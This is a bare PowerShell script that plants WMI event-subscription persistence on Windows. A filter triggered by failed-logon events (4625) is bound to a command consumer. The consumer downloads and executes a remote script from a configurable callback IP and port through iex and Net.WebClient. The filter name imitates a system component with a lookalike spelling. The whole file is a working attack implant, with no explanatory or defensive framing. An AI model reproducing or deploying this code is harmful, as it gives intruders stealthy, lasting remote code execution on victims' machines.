$CALLBACK_IP = "<CHANGEME>"
$CALLBACK_PORT = "<CHANGEME>"

$EventName = "SCM Event Log Fi1ter"
$Payload = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop `"iex(New-Object Net.WebClient).DownloadString('http://$($CALLBACK_IP):$($CALLBACK_PORT)/backup.ps1');`""

# Binding of EventFilter-and-EventConsumer
$FilterToConsumerBinding = $(Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root/subscription' -Arguments @{
   Filter = $(Set-WmiInstance -Class __EventFilter -Namespace 'root/subscription' -Arguments @{
      EventNamespace = 'root/cimv2'
      Name = $EventName
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4625' AND TargetInstance.Logfile='Security'"
      QueryLanguage = 'WQL'
   })
   Consumer = $(Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root/subscription' -Arguments @{
      Name = $EventName
      CommandLineTemplate = $Payload
      ExecutablePath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
   })
})

$FilterToConsumerBinding